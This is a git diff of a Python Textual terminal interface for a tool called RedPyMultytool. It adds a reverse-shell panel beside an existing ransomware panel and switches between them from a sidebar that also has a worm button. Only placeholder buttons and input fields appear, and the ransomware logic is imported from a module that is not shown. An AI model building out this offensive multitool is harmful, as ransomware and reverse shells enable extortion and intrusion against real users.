@@ -1,7 +1,8 @@
 from textual.app import App, ComposeResult
 from textual.containers import ScrollableContainer, Container, Horizontal
-from textual.widgets import Button, Footer, Header, Static, Switch
+from textual.widgets import Button, Footer, Header, Static, Switch, Input
 from cryptography.fernet import Fernet
+from cipher import Ramsom
 
 class Title(Static):
     pass
@@ -31,10 +32,32 @@ class Sidebar(Container):
         yield Button("Worm",id="wr", variant="success")
         yield DarkSwitch()
 
+    def on_button_pressed(self,event:Button.Pressed) -> None:
+        button_id=event.button.id
+        if button_id=="rmw":
+            self.add_class("rams")
+            self.remove_class("shell")
+        elif button_id=="sh":
+            self.add_class("shell")
+            self.remove_class("rams")
+
+class ReverseSH(Static):
+    def compose(self) -> ComposeResult:
+        yield Container(
+        Button("prova",id="start", variant="success"),
+        Input(placeholder="Prova"),
+        Input(placeholder="Prova"),
+        Button("prova2",id="stop", variant="success"),
+        id="reverseSH")
+
 class Ramsomware(Static):
     def compose(self) -> ComposeResult:
-        yield Button("prova",id="start", variant="success")
-        yield Button("prova2",id="stop", variant="success")
+        yield Container(
+        Button("prova",id="start", variant="success"),
+        Input(placeholder="Prova"),
+        Input(placeholder="Prova"),
+        Button("prova2",id="stop", variant="success"),
+        id="ramsom")
 
     def on_button_pressed(self,event:Button.Pressed) -> None:
         button_id=event.button.id
@@ -51,7 +74,7 @@ class RedPyMultytool(App):
         yield Sidebar(classes="-hidden")
         yield Container(
             Ramsomware(),
-            Ramsomware())
+            ReverseSH())
         yield Footer()
         
     def action_toggle_sidebar(self) -> None:
